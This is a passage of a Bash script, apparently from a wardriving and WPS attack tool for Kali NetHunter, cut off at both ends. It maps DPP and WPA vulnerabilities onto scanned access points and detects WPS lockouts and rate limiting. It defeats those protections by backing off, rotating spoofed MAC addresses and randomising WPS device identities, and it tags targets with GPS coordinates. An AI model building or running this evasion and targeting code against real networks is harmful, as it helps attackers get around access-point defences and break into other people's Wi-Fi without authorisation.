	blob="${maker} ${model} ${fw}"
	blob="${blob,,}"

	if [[ "$dpp_pkex" == "YES" ]] || [[ "$blob" =~ (hostapd|wpa_supplicant|wpa-supplicant|iwd) ]]; then
		hits+=("${DPP_CVES[hostapd_pkex]}(potential-hostapd)")
		hits+=("${DPP_CVES[pkex_group_downgrade]}")
	fi

	if [[ "$dpp_conf" == "YES" ]]; then
		hits+=("${DPP_CVES[configurator_impersonation]}")
		hits+=("${DPP_CVES[ppk_no_revocation]}")
	fi

	printf '%s\n' "${hits[*]:-}"
}

function wait_socket() {
	local f="$1" w="${2:-5}"
	local end
	end=$(($(date +%s) + w))
	while (($(date +%s) < end)); do
		if [[ -S "$f" ]]; then return 0; fi
		sleep 0.1
	done
	return 1
}

function lock_state() {
	local lf="$1"
	if [[ ! -f "$lf" ]]; then
		echo "none"
		return 0
	fi
	if grep -qiE 'WPS lock|WPS-AP-locked|AP locked|reject.*WPS|AP rate limiting' "$lf" 2>/dev/null; then
		echo "hard"
		return 0
	fi
	if grep -qiE 'Receive timeout occurred' "$lf" 2>/dev/null; then
		echo "soft"
		return 0
	fi
	if grep -qiE 'out of memory|kernel panic|segmentation fault' "$lf" 2>/dev/null; then
		echo "crash"
		return 0
	fi
	echo "none"
}

function in_lockout() {
	if [[ ! -f "$LOCK_FILE" ]]; then return 1; fi
	awk -v k="$1" -v now="$(date +%s)" '$1==k && $2>now {f=1} END {exit f?0:1}' "$LOCK_FILE"
}

function already_known() {
	if [[ ! -f "$KNOWN_FILE" ]]; then return 1; fi
	grep -qxF "$1" "$KNOWN_FILE" 2>/dev/null
}

function is_processed() {
	local b="$1" ts now
	[[ -n "${PROCESSED_FILE:-}" && -f "$PROCESSED_FILE" ]] || return 1
	ts=$(awk -v k="${b,,}" 'tolower($1)==k{t=$2} END{print t+0}' "$PROCESSED_FILE" 2>/dev/null)
	[[ "$ts" =~ ^[0-9]+$ ]] && ((ts > 0)) || return 1
	((${PROCESSED_TTL:-0} <= 0)) && return 0
	now=$(date +%s)
	((now - ts < PROCESSED_TTL))
}

function mark_processed() {
	local b="$1"
	[[ -n "${PROCESSED_FILE:-}" ]] || return 0
	is_processed "$b" && return 0
	printf '%s %s\n' "${b,,}" "$(date +%s)" >>"$PROCESSED_FILE" 2>/dev/null || true
}

function do_backoff() {
	local b="$1" t="$2"
	local now
	now=$(date +%s)
	local delay="${BASE_LOCK_DELAY:-5}" reason=""
	local esc_file="${TMP_DIR:-/tmp}/lock_escalation.txt"
	local last_delay=0

	case "$t" in
	hard)
		delay="${MAX_LOCK_DELAY:-7}"
		reason="hard WPS lockout"
		;;
	crash)
		delay=$((${MAX_LOCK_DELAY:-7} / 3))
		((delay < 2)) && delay=2
		reason="AP error"
		;;
	soft)
		if [[ ! -f "$esc_file" ]]; then : >"$esc_file" 2>/dev/null || true; fi
		{
			flock -x 200
			last_delay=$(awk -v key="$b" '$1==key{print $2;exit}' "$esc_file" 2>/dev/null)
		} 200>"${esc_file}.lock"

		if [[ "$last_delay" =~ ^[0-9]+$ ]] && ((last_delay >= ${BASE_LOCK_DELAY:-5})); then
			delay=$((last_delay * 2))
			reason="escalated from ${last_delay}"
		else
			delay="${BASE_LOCK_DELAY:-5}"
			last_delay=0
			reason="first soft lockout (base delay)"
		fi
		;;
	*)
		return 0
		;;
	esac

	if ((delay > ${MAX_LOCK_DELAY:-7})); then delay="${MAX_LOCK_DELAY:-7}"; fi
	if [[ ! "$delay" =~ ^[0-9]+$ || "$delay" -le 0 ]]; then delay="${BASE_LOCK_DELAY:-5}"; fi

	local expiry=$((now + delay)) lock_tmp
	lock_tmp=$(mktemp "${LOCK_FILE}.tmp.XXXXXX") || return 1

	{
		flock -x 200
		awk -v key="$b" -v ex="$expiry" -v val="$delay" -v now="$now" '
            $1==key{found=1;print key,ex,val;next} $2>now{print} END{if(!found)print key,ex,val}
        ' "$LOCK_FILE" >"$lock_tmp"
		mv -f "$lock_tmp" "$LOCK_FILE" || {
			rm -f "$lock_tmp"
			return 1
		}
	} 200>"${LOCK_FILE}.lock"

	if [[ "$t" == "soft" ]]; then
		local esc_tmp
		if [[ ! -f "$esc_file" ]]; then : >"$esc_file" 2>/dev/null || true; fi
		esc_tmp=$(mktemp "${esc_file}.tmp.XXXXXX") || return 1
		{
			flock -x 200
			awk -v key="$b" -v val="$delay" '
                $1==key{found=1;print key,val;next}{print} END{if(!found)print key,val}
            ' "$esc_file" >"$esc_tmp"
			mv -f "$esc_tmp" "$esc_file" || {
				rm -f "$esc_tmp"
				return 1
			}
		} 200>"${esc_file}.lock"
	fi

	print_log WARN LOCKOUT "Locked $b"
	log_attempt "$b" "backoff" "$t" "sleep ${delay}s reason=$reason"

	local lc_file="${TMP_DIR:-/tmp}/lock_counts.txt"
	if [[ ! -f "$lc_file" ]]; then : >"$lc_file" 2>/dev/null || true; fi

	local lc_tmp count=0
	lc_tmp=$(mktemp "${lc_file}.tmp.XXXXXX") || return 1
	{
		flock -x 200
		if [[ -f "$lc_file" ]]; then
			count=$(awk -v key="$b" '$1==key{print $2;exit}' "$lc_file" 2>/dev/null)
		fi
		if [[ ! "$count" =~ ^[0-9]+$ ]]; then count=0; fi
		((++count)) || true
		awk -v key="$b" -v val="$count" '$1==key{found=1;print key,val;next}{print}END{if(!found)print key,val}' "$lc_file" >"$lc_tmp"
		mv -f "$lc_tmp" "$lc_file" || {
			rm -f "$lc_tmp"
			return 1
		}
	} 200>"${lc_file}.lock"

	if ((count >= 3)); then
		print_log INFO MAC "New MAC"
		stealth_mac_rotate || true
		sleep "${MAC_ROTATE_DELAY:-3}"
		lc_tmp=$(mktemp "${lc_file}.tmp.XXXXXX") || return 1
		{
			flock -x 200
			awk -v key="$b" '$1==key{found=1;print key,0;next}{print}END{if(!found)print key,0}' "$lc_file" >"$lc_tmp"
			mv -f "$lc_tmp" "$lc_file" || { rm -f "$lc_tmp"; }
		} 200>"${lc_file}.lock"
		count=0
	fi

	sleep "$delay"
	return 0
}

function iface_get_type() {
	iw dev "$IFACE" info 2>/dev/null | awk '/type/{print $2;exit}'
}

function iface_set_type() {
	local want="$1" cur retry
	cur=$(iface_get_type)
	if [[ "$cur" == "$want" ]]; then return 0; fi

	local retries="${IFACE_RETRIES:-3}"
	local retry_delay="${IFACE_RETRY_DELAY:-2}"

	for ((retry = 1; retry <= retries; retry++)); do
		ip link set "$IFACE" down 2>/dev/null || true
		sleep 1
		if iw dev "$IFACE" set type "$want" 2>/dev/null; then
			ip link set "$IFACE" up 2>/dev/null || true
			sleep 1
			cur=$(iface_get_type)
			if [[ "$cur" == "$want" ]]; then return 0; fi
			print_log WARN IFACE "Want $want, got $cur ($retry/$retries)"
		else
			print_log WARN IFACE "Cannot set $want ($retry/$retries)"
			ip link set "$IFACE" up 2>/dev/null || true
		fi

		if ((retry < retries)); then
			print_log WARN IFACE "Retry ${retry_delay}s"
			sleep "$retry_delay"
		fi
	done

	ip link set "$IFACE" up 2>/dev/null || true
	print_log ERROR IFACE "Iface failed"
	return 1
}

function ensure_mode() {
	local want="$1"
	if [[ "$CURRENT_MODE" != "$want" ]]; then
		if iface_set_type "$want"; then
			CURRENT_MODE="$want"
			return 0
		else
			return 1
		fi
	fi
	return 0
}

function iface_set_channel() {
	iw dev "$IFACE" set channel "$1" 2>/dev/null
}

function stealth_gen_mac() {
	local hex
	hex=$(head -c 6 /dev/urandom 2>/dev/null | od -An -tx1 | tr -d '\n') || return 1
	if [[ ${#hex} -ne 12 ]]; then return 1; fi
	local b0=$(((16#${hex:0:2} & 0xFC) | 0x02))
	printf '%02x:%s:%s:%s:%s:%s\n' "$b0" "${hex:2:2}" "${hex:4:2}" "${hex:6:2}" "${hex:8:2}" "${hex:10:2}"
}

function stealth_gen_uuid() {
	local hex
	hex=$(head -c 16 /dev/urandom 2>/dev/null | od -An -tx1 | tr -d '\n') || return 1
	if [[ ${#hex} -ne 32 ]]; then return 1; fi
	local v=$(((16#${hex:12:2} & 0x0F) | 0x40))
	local c=$(((16#${hex:16:2} & 0x3F) | 0x80))
	printf '%s-%s-%02x%s-%02x%s-%s\n' "${hex:0:8}" "${hex:8:4}" "$v" "${hex:14:2}" "$c" "${hex:18:2}" "${hex:20:12}"
}

function iface_get_mac() {
	ip link show "$IFACE" 2>/dev/null | awk '/link\/ether/{print tolower($2);exit}'
}

function stealth_mac_apply() {
	local mac="$1" cur_type
	if [[ -z "$mac" ]]; then return 1; fi
	cur_type=$(iface_get_type)
	ip link set "$IFACE" down 2>/dev/null || true
	sleep 0.5
	if ! ip link set "$IFACE" address "$mac" 2>/dev/null; then
		ip link set "$IFACE" up 2>/dev/null || true
		return 1
	fi
	ip link set "$IFACE" up 2>/dev/null || true
	sleep 0.5
	if [[ -n "$cur_type" && "$cur_type" != "managed" ]]; then
		iw dev "$IFACE" set type "$cur_type" 2>/dev/null || true
	fi
	return 0
}

function stealth_mac_rotate() {
	if [[ "${ENABLE_STEALTH_MAC:-1}" != "1" ]]; then return 0; fi
	local m
	if m=$(stealth_gen_mac) && stealth_mac_apply "$m"; then
		print_log INFO STEALTH "MAC -> $m"
		return 0
	fi
	if command -v macchanger &>/dev/null; then
		local ct
		ct=$(iface_get_type)
		ip link set "$IFACE" down 2>/dev/null || true
		sleep 0.5
		macchanger -r "$IFACE" >/dev/null 2>&1 || true
		ip link set "$IFACE" up 2>/dev/null || true
		sleep 0.5
		if [[ -n "$ct" && "$ct" != "managed" ]]; then
			iw dev "$IFACE" set type "$ct" 2>/dev/null || true
		fi
		print_log INFO STEALTH "MAC changed"
		return 0
	fi
	print_log WARN STEALTH "MAC failed"
	return 1
}

function stealth_wps_id_block() {
	if [[ "${ENABLE_STEALTH_WPS_ID:-1}" != "1" ]]; then return 0; fi
	if [[ -z "${STEALTH_UUID:-}" ]]; then STEALTH_UUID=$(stealth_gen_uuid); fi
	local r1 r2 r3 r4 r5
	r1=$(head -c 4 /dev/urandom | od -An -tx1 | tr -d '\n')
	r2=$(head -c 4 /dev/urandom | od -An -tx1 | tr -d '\n')
	r3=$(head -c 4 /dev/urandom | od -An -tx1 | tr -d '\n')
	r4=$(head -c 4 /dev/urandom | od -An -tx1 | tr -d '\n')
	r5=$(head -c 4 /dev/urandom | od -An -tx1 | tr -d '\n')
	printf 'uuid=%s\ndevice_name=%s\nmanufacturer=%s\nmodel_name=%s\nmodel_number=%s\nserial_number=%s\n' \
		"$STEALTH_UUID" "$r1" "$r2" "$r3" "$r4" "$r5"
}

function iface_do_scan() {
	timeout "${SCAN_TIMEOUT:-25}" iw dev "$IFACE" scan >>"$1" 2>/dev/null || true
}

function iface_do_scan_freq() {
	local out="$1"
	shift
	timeout "${SCAN_TIMEOUT:-25}" iw dev "$IFACE" scan freq "$@" >>"$out" 2>/dev/null || true
}

function chan2freq() {
	case "$1" in
	24) echo $((2407 + 5 * $2)) ;;
	5) echo $((5000 + 5 * $2)) ;;
	6) echo $((5950 + 5 * $2)) ;;
	esac
}

function freq2chan() {
	case "$1" in
	24*) echo $((($1 - 2407) / 5)) ;;
	5*) echo $((($1 - 5000) / 5)) ;;
	6* | 7*) echo $((($1 - 5950) / 5)) ;;
	*) echo 1 ;;
	esac
}

function json_escape() {
	local s="$1"
	s=${s//\\/\\\\}
	s=${s//\"/\\\"}
	s=${s//$'\n'/\\n}
	s=${s//$'\r'/\\r}
	s=${s//$'\t'/\\t}
	printf '%s' "$s"
}

function sar_json_get() {
	local json="${1:-}" key="${2:-}" pattern value
	[[ "$key" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || return 1
	pattern="\"${key}\"[[:space:]]*:[[:space:]]*\"(([^\"\\\\]|\\\\.)*)\""
	[[ "$json" =~ $pattern ]] || return 1
	value="${BASH_REMATCH[1]}"
	value="${value//\\\"/\"}"
	value="${value//\\\\/\\}"
	printf '%s\n' "$value"
}

function rule_result_pack() {
	local item
	local -a fields=("$@")
	for item in "${fields[@]}"; do
		[[ "$item" != *$'\036'* ]] || return 1
	done
	local IFS=$'\036'
	printf '%s' "${fields[*]}"
}

function rule_result_emit_wire() {
	if [[ -n "${RULE_TRACE_FILE:-}" ]]; then
		if ! {
			printf '%s\036' "$@"
			printf '\n'
		} >>"$RULE_TRACE_FILE" 2>/dev/null; then
			RULE_TRACE_FILE=""
			print_log WARN RULE "Trace failed"
		fi
	fi
	return 0
}

function _ar_engine_dw() {
	local function_name="${1:-}"
	shift || true
	[[ -n "$function_name" ]] || return 0
	if declare -F "$function_name" &>/dev/null; then
		"$function_name" "$@" || true
	fi
	return 0
}

function location_is_enabled() {
	case "${ENABLE_LOCATION:-no}" in
	1 | yes | YES | true | TRUE | on | ON) return 0 ;;
	*) return 1 ;;
	esac
}

function location_ingest_scan_targets() {
	local path="${1:-}" scan_number="${2:-0}"
	local bssid essid signal
	[[ -r "$path" ]] || return 1
	while IFS=$'\036' read -r bssid essid signal || [[ -n "$bssid" ]]; do
		[[ -n "$bssid" ]] || continue
		LOCATION_OBSERVATIONS+=("${scan_number}|${bssid}|${essid}|${signal}")
	done <"$path"
}

# --- Android -> Kali GPS bridge ----------------------------------------------
# CyclePatrol runs inside the Kali NetHunter chroot, which shares the Android
# kernel but has NO access to the Android LocationManager/GPS HAL and no
# /dev/tty* GPS device. Coordinates therefore must come FROM the Android side:
#   termux-location (Termux:API -> Android LocationManager)  [preferred], or
#   an already-fed gpsd read one-shot with gpspipe           [fallback].
# Every path is time-bounded, logs [GPS] diagnostics, and never fabricates a
# coordinate. A missing bridge is reported, not waited on forever.

function location_env() {
	local label="linux"
	if [[ -e /system/bin/sh || -d /system/app || -n "${ANDROID_ROOT:-}" || -n "${ANDROID_DATA:-}" ]]; then
		label="android/kali-nethunter(chroot)"
	fi
	printf '%s' "$label"
}

function location_valid() {
	local lat="${1:-}" lon="${2:-}"
	[[ "$lat" =~ ^-?[0-9]+(\.[0-9]+)?$ && "$lon" =~ ^-?[0-9]+(\.[0-9]+)?$ ]] || return 1
	awk -v a="$lat" -v o="$lon" 'BEGIN{a+=0;o+=0;if(a==0&&o==0)exit 1;if(a<-90||a>90)exit 1;if(o<-180||o>180)exit 1;exit 0}'
}

# decimal degrees -> NMEA "ddmm.mmmm H" (islat=1) or "dddmm.mmmm H" (islat=0)
function _dd_to_nmea() {
	awk -v v="$1" -v islat="$2" 'BEGIN{
		h=(v<0)?(islat?"S":"W"):(islat?"N":"E"); if(v<0)v=-v;
		d=int(v); m=(v-d)*60.0;
		if(islat==1) printf "%02d%07.4f %s", d, m, h; else printf "%03d%07.4f %s", d, m, h;
	}'
}

# XOR checksum (two uppercase hex digits) of an NMEA sentence body.
function _nmea_checksum() {
	local s="$1" i c=0 ch
	for ((i = 0; i < ${#s}; i++)); do
		printf -v ch '%d' "'${s:i:1}"
		c=$((c ^ ch))
	done
	printf '%02X' "$c"
}

# Send one GGA+RMC pair (built from decimal lat/lon) to gpsd's UDP source port.
function _nmea_send() {
	local host="$1" port="$2" lat="$3" lon="$4"
	local t d la lah lo loh gga rmc
	t="$(date -u +%H%M%S 2>/dev/null)" || t="000000"
	d="$(date -u +%d%m%y 2>/dev/null)" || d="010100"
	IFS=' ' read -r la lah <<<"$(_dd_to_nmea "$lat" 1)"
	IFS=' ' read -r lo loh <<<"$(_dd_to_nmea "$lon" 0)"
	gga="GPGGA,${t}.00,${la},${lah},${lo},${loh},1,08,0.9,10.0,M,0.0,M,,"
	rmc="GPRMC,${t}.00,A,${la},${lah},${lo},${loh},0.0,0.0,${d},,,A"
	gga="\$${gga}*$(_nmea_checksum "$gga")"
	rmc="\$${rmc}*$(_nmea_checksum "$rmc")"
	{ printf '%s\r\n%s\r\n' "$gga" "$rmc" >"/dev/udp/${host}/${port}"; } 2>/dev/null || return 1
	return 0
}

# Parse a termux-location JSON blob -> "lat lon acc" (stdout), empty on miss.
function _loc_parse_termux() {
	local raw="$1" lat lon acc
	if command -v jq >/dev/null 2>&1; then
		lat="$(printf '%s' "$raw" | jq -r '.latitude // empty' 2>/dev/null || true)"
		lon="$(printf '%s' "$raw" | jq -r '.longitude // empty' 2>/dev/null || true)"
		acc="$(printf '%s' "$raw" | jq -r '.accuracy // empty' 2>/dev/null || true)"
	else
		lat="$(printf '%s' "$raw" | sed -n 's/.*"latitude"[^0-9-]*\(-\{0,1\}[0-9.]*\).*/\1/p' | head -1)"
		lon="$(printf '%s' "$raw" | sed -n 's/.*"longitude"[^0-9-]*\(-\{0,1\}[0-9.]*\).*/\1/p' | head -1)"
		acc="$(printf '%s' "$raw" | sed -n 's/.*"accuracy"[^0-9-]*\(-\{0,1\}[0-9.]*\).*/\1/p' | head -1)"
	fi
	printf '%s %s %s' "$lat" "$lon" "$acc"
}

# Obtain ONE location fix via the best Android->Kali bridge available.
# stdout on success: "lat lon acc source"; returns 0 ok / 1 no-fix. Bounded.
function location_fix() {
	local to="${LOCATION_TIMEOUT:-20}" prov="${LOCATION_PROVIDER:-}" raw p lat="" lon="" acc="" src=""
	[[ "$to" =~ ^[0-9]+$ ]] || to=20
	LOCATION_FIX_RESULT=""
	print_log INFO GPS "requesting location"
	print_log INFO GPS "execution environment: $(location_env)"

	if command -v termux-location >/dev/null 2>&1; then
		src="termux-location"
		p="${prov:-gps}"
		print_log INFO GPS "provider: $src ($p)"
		print_log INFO GPS "command started: termux-location -p $p (timeout ${to}s)"
		raw="$(timeout --kill-after=3 -- "$to" termux-location -p "$p" 2>/dev/null || true)"
		if [[ -n "$raw" ]]; then print_log INFO GPS "command returned output"; else print_log WARN GPS "no output (timeout / provider unavailable)"; fi
		[[ -n "$raw" ]] && IFS=' ' read -r lat lon acc <<<"$(_loc_parse_termux "$raw")"
		if ! location_valid "$lat" "$lon" && [[ "$p" != "network" ]]; then
			print_log INFO GPS "retry provider: network"
			raw="$(timeout --kill-after=3 -- "$to" termux-location -p network 2>/dev/null || true)"
			[[ -n "$raw" ]] && IFS=' ' read -r lat lon acc <<<"$(_loc_parse_termux "$raw")"
		fi
	fi

	if ! location_valid "$lat" "$lon" && command -v gpspipe >/dev/null 2>&1; then
		src="gpsd"
		print_log INFO GPS "provider: gpsd (gpspipe -w)"
		raw="$(timeout --kill-after=3 -- "$to" gpspipe -w -n 30 2>/dev/null | grep -m1 '"lat"' || true)"
		if [[ -n "$raw" ]]; then
			lat="$(printf '%s' "$raw" | sed -n 's/.*"lat":\(-\{0,1\}[0-9.]*\).*/\1/p' | head -1)"
			lon="$(printf '%s' "$raw" | sed -n 's/.*"lon":\(-\{0,1\}[0-9.]*\).*/\1/p' | head -1)"
			acc="$(printf '%s' "$raw" | sed -n 's/.*"epx":\(-\{0,1\}[0-9.]*\).*/\1/p' | head -1)"
		fi
	fi

	if location_valid "$lat" "$lon"; then
		print_log OK GPS "latitude received: $lat"
		print_log OK GPS "longitude received: $lon"
		[[ -n "$acc" ]] && print_log INFO GPS "accuracy received: ${acc}m"
		LOCATION_FIX_RESULT="$lat $lon ${acc:-?} $src"
		print_log OK GPS "fix: $LOCATION_FIX_RESULT"
		return 0
	fi

	if [[ -z "$src" ]]; then
		print_log ERROR GPS "no location bridge: Kali chroot has no direct Android GPS. Install Termux:API (termux-location) or feed gpsd an NMEA source."
	else
		print_log ERROR GPS "no fix from ${src}: location services off, permission denied, or no signal (indoors)."
	fi
	return 1
}

# Background feeder: Android location -> NMEA -> gpsd UDP source port.
# Echoes its pid on stdout. Caller tracks it in BG_PIDS and kills it.
function location_nmea_feeder() {
	local host="${1:-127.0.0.1}" port="${2:-2947}"
	command -v termux-location >/dev/null 2>&1 || {
		printf ''
		return 1
	}
	(
		while :; do
			local fr flat flon facc
			fr="$(timeout --kill-after=3 -- "${LOCATION_TIMEOUT:-20}" termux-location -p "${LOCATION_PROVIDER:-gps}" 2>/dev/null || true)"
			[[ -z "$fr" ]] && fr="$(timeout --kill-after=3 -- "${LOCATION_TIMEOUT:-20}" termux-location -p network 2>/dev/null || true)"
			IFS=' ' read -r flat flon facc <<<"$(_loc_parse_termux "$fr")"
			location_valid "$flat" "$flon" && _nmea_send "$host" "$port" "$flat" "$flon"
			sleep "${LOCATION_FEED_INTERVAL:-3}"
		done
	) >/dev/null 2>&1 &
	printf '%s' "$!"
	return 0
}

function vendor_kb_available() {
	[[ "${ENABLE_VENDOR_KB:-1}" == "1" ]] || return 1
	[[ -n "${VENDOR_DIR:-}" ]] || return 1
	[[ -f "${VENDOR_DIR}/oui.json" && -f "${VENDOR_DIR}/vendors.json" ]] || return 1
	return 0
}

function vendor_kb_lookup_oui() {
	local mac="$1" oui file line id
	vendor_kb_available || {
		printf ''
		return 1
	}
	oui=$(normalize_oui "$mac" 2>/dev/null || true)
	[[ -n "$oui" && "$oui" != "unknown" ]] || {
		printf ''
		return 1
	}
	file="${VENDOR_DIR}/oui.json"
	line=$(grep -i -E "\"${oui}\"[[:space:]]*:[[:space:]]*\"[^\"]+\"" "$file" 2>/dev/null | head -n1 || true)
	[[ -n "$line" ]] || {
		printf ''
		return 1
	}
	id="${line##*\": \"}"
	id="${id%%\"*}"
	[[ -n "$id" ]] || {
		printf ''
		return 1
	}
	printf '%s' "$id"
	return 0
}

function vendor_kb_vendor_name() {
	local vid="$1" file line name
	[[ -n "$vid" ]] || {
		printf ''
		return 1
	}
	vendor_kb_available || {
		printf ''
		return 1
	}
	file="${VENDOR_DIR}/vendors.json"
	if command -v jq >/dev/null 2>&1; then
		name=$(jq -r --arg id "$vid" '.[$id].name // empty' "$file" 2>/dev/null || true)
		printf '%s' "$name"
		[[ -n "$name" ]]
		return $?
	fi
	name=$(sed -n "/\"${vid}\"[[:space:]]*:/,/^  \"[^\"]\+\"[[:space:]]*:/p" "$file" 2>/dev/null |
		grep -m1 '"name"' |
		sed -n 's/.*"name"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' || true)
	printf '%s' "$name"
	[[ -n "$name" ]]
}

function vendor_kb_vendor_array() {
	local vid="$1" key="$2" file
	[[ -n "$vid" && -n "$key" ]] || return 1
	vendor_kb_available || return 1
	file="${VENDOR_DIR}/vendors.json"
	if command -v jq >/dev/null 2>&1; then
		jq -r --arg id "$vid" --arg k "$key" '.[$id][$k][]? // empty' "$file" 2>/dev/null
		return 0
	fi
	awk -v id="$vid" -v key="$key" '
        $0 ~ "\""id"\"[[:space:]]*:" {found=1; next}
        found && /"[^"]+"[[:space:]]*:[[:space:]]*\{/ && $0 !~ "\""id"\"" {exit}
        found && $0 ~ "\""key"\"[[:space:]]*:" {arr=1}
        found && arr {
            n = split($0, parts, "\"")
            for (i = 2; i <= n; i += 2) {
                s = parts[i]
                if (s == key) continue
                if (s == "") continue
                if (s ~ /:[[:space:]]*\[/ ) continue
                print s
            }
            if ($0 ~ /\]/) exit
        }
    ' "$file" 2>/dev/null
}

function vendor_kb_enrich_sar_json() {
	local bssid="$1" json="$2"
	local vid name behaviours line b
	vendor_kb_available || {
		printf '%s' "$json"
		return 0
	}
	[[ -n "$json" ]] || {
		printf '%s' "$json"
		return 0
	}
	if [[ "$json" == *'"vendor_kb_id"'* ]]; then
		printf '%s' "$json"
		return 0
	fi
	vid=$(vendor_kb_lookup_oui "$bssid" || true)
	[[ -n "$vid" ]] || {
		printf '%s' "$json"
		return 0
	}
	name=$(vendor_kb_vendor_name "$vid" || true)
	behaviours=""
	while IFS= read -r line || [[ -n "$line" ]]; do
		[[ -n "$line" ]] || continue
		if [[ -z "$behaviours" ]]; then behaviours="$line"; else behaviours+=",$line"; fi
	done < <(vendor_kb_vendor_array "$vid" behaviours || true)
	json="${json%\}}"
	json="${json},\"vendor_kb_id\":\"$(json_escape "$vid")\",\"vendor_kb_name\":\"$(json_escape "${name:-}")\",\"vendor_kb_behaviours\":\"$(json_escape "$behaviours")\"}"
	printf '%s' "$json"
}

function he_sar_enrich_json() {
	local json="$1"
	local he_present="${2:-}" he_capabilities_present="${3:-}" he_operation_present="${4:-}"
	local he_bss_color="${5:-}" he_twt_supported="${6:-}" he_ul_mu_mimo="${7:-}" he_dl_mu_mimo="${8:-}"
	local he_ul_ofdma="${9:-}" he_dl_ofdma="${10:-}" he_160mhz="${11:-}" he_80p80="${12:-}"
	local he_spatial_streams="${13:-}" he_raw_capabilities_hex="${14:-}"
	local -a parts=()
	local joined
	[[ "$he_present" == "YES" ]] || {
		printf '%s' "$json"
		return 0
	}
	[[ "$json" == *'"he_present"'* ]] && {
		printf '%s' "$json"
		return 0
	}
	[[ -n "$he_present" ]] && parts+=("\"he_present\":\"$(json_escape "$he_present")\"")
	[[ -n "$he_capabilities_present" ]] && parts+=("\"he_capabilities_present\":\"$(json_escape "$he_capabilities_present")\"")
	[[ -n "$he_operation_present" ]] && parts+=("\"he_operation_present\":\"$(json_escape "$he_operation_present")\"")
	[[ -n "$he_bss_color" ]] && parts+=("\"he_bss_color\":\"$(json_escape "$he_bss_color")\"")
	[[ -n "$he_twt_supported" ]] && parts+=("\"he_twt_supported\":\"$(json_escape "$he_twt_supported")\"")
	[[ -n "$he_ul_mu_mimo" ]] && parts+=("\"he_ul_mu_mimo\":\"$(json_escape "$he_ul_mu_mimo")\"")
	[[ -n "$he_dl_mu_mimo" ]] && parts+=("\"he_dl_mu_mimo\":\"$(json_escape "$he_dl_mu_mimo")\"")
	[[ -n "$he_ul_ofdma" ]] && parts+=("\"he_ul_ofdma\":\"$(json_escape "$he_ul_ofdma")\"")
	[[ -n "$he_dl_ofdma" ]] && parts+=("\"he_dl_ofdma\":\"$(json_escape "$he_dl_ofdma")\"")
	[[ -n "$he_160mhz" ]] && parts+=("\"he_160mhz\":\"$(json_escape "$he_160mhz")\"")
	[[ -n "$he_80p80" ]] && parts+=("\"he_80p80\":\"$(json_escape "$he_80p80")\"")
	[[ -n "$he_spatial_streams" ]] && parts+=("\"he_spatial_streams\":\"$(json_escape "$he_spatial_streams")\"")
	[[ -n "$he_raw_capabilities_hex" ]] && parts+=("\"he_raw_capabilities_hex\":\"$(json_escape "$he_raw_capabilities_hex")\"")
	((${#parts[@]} > 0)) || {
		printf '%s' "$json"
		return 0
	}
	joined=$(
		IFS=,
		printf '%s' "${parts[*]}"
	)
	json="${json%\}}"
	json="${json},${joined}}"
	printf '%s' "$json"
}

function eht_sar_enrich_json() {
	local json="$1"
	local eht_present="${2:-}" eht_capabilities_present="${3:-}" eht_operation_present="${4:-}"
	local eht_320mhz="${5:-}" eht_puncturing_supported="${6:-}" eht_mlo_supported="${7:-}" eht_mlo_ap="${8:-}"
	local eht_spatial_streams="${9:-}" eht_mcs_max="${10:-}" eht_raw_capabilities_hex="${11:-}"
	local -a parts=()
	local joined
	[[ "$eht_present" == "YES" ]] || {
		printf '%s' "$json"
		return 0
	}
	[[ "$json" == *'"eht_present"'* ]] && {
		printf '%s' "$json"
		return 0
	}
	[[ -n "$eht_present" ]] && parts+=("\"eht_present\":\"$(json_escape "$eht_present")\"")
	[[ -n "$eht_capabilities_present" ]] && parts+=("\"eht_capabilities_present\":\"$(json_escape "$eht_capabilities_present")\"")
	[[ -n "$eht_operation_present" ]] && parts+=("\"eht_operation_present\":\"$(json_escape "$eht_operation_present")\"")
	[[ -n "$eht_320mhz" ]] && parts+=("\"eht_320mhz\":\"$(json_escape "$eht_320mhz")\"")
	[[ -n "$eht_puncturing_supported" ]] && parts+=("\"eht_puncturing_supported\":\"$(json_escape "$eht_puncturing_supported")\"")
	[[ -n "$eht_mlo_supported" ]] && parts+=("\"eht_mlo_supported\":\"$(json_escape "$eht_mlo_supported")\"")
	[[ -n "$eht_mlo_ap" ]] && parts+=("\"eht_mlo_ap\":\"$(json_escape "$eht_mlo_ap")\"")
	[[ -n "$eht_spatial_streams" ]] && parts+=("\"eht_spatial_streams\":\"$(json_escape "$eht_spatial_streams")\"")
	[[ -n "$eht_mcs_max" ]] && parts+=("\"eht_mcs_max\":\"$(json_escape "$eht_mcs_max")\"")
	[[ -n "$eht_raw_capabilities_hex" ]] && parts+=("\"eht_raw_capabilities_hex\":\"$(json_escape "$eht_raw_capabilities_hex")\"")
	((${#parts[@]} > 0)) || {
		printf '%s' "$json"
		return 0
	}
	joined=$(
		IFS=,
		printf '%s' "${parts[*]}"
	)
	json="${json%\}}"
	json="${json},${joined}}"
	printf '%s' "$json"
}

function sar_store_record() {
	local bssid="$1" essid="$2" signal="$3" channel="$4" chip="$5" cves="$6"
	local wps_ver="$7" wps_state="$8" device_password_id="$9" config_methods="${10}"
	local wps_hidden="${11}" sel_reg="${12}"
	local maker="${13}" model="${14}" device_name="${15}" serial="${16}" firmware="${17}" uuid="${18}"
	local pmf_raw="${19}" pmf_mode="${20}" rsn_caps="${21}" akm_list="${22}"
	local wpa3="${23}" wpa3_tm="${24}" owe_tm="${25}"
	local rsn_gw="${26}" rsn_pw="${27}" rsn_gm="${28}" rsnxe_list="${29}" extcap_list="${30}"
	local tkip="${31}" wpa1="${32}"
	local dpp="${33}" dpp_ver="${34}" dpp_conf="${35}" dpp_pkex="${36}" dpp_vulns="${37}"
	local pin_known="${38}" hidden_pin_candidate="${39}" cfg_methods_no_pin_display="${40}"
	local transition_disable="${41:-UNKNOWN}" td_bitmap="${42:-}" rsnxe_cap_hex="${43:-}" wpa3_mode="${44:-unknown}" pmf_grade="${45:-unknown}"
	local he_present="${46:-}" he_capabilities_present="${47:-}" he_operation_present="${48:-}"
	local he_bss_color="${49:-}" he_twt_supported="${50:-}" he_ul_mu_mimo="${51:-}" he_dl_mu_mimo="${52:-}"
	local he_ul_ofdma="${53:-}" he_dl_ofdma="${54:-}" he_160mhz="${55:-}" he_80p80="${56:-}"
	local he_spatial_streams="${57:-}" he_raw_capabilities_hex="${58:-}"
	local eht_present="${59:-}" eht_capabilities_present="${60:-}" eht_operation_present="${61:-}"
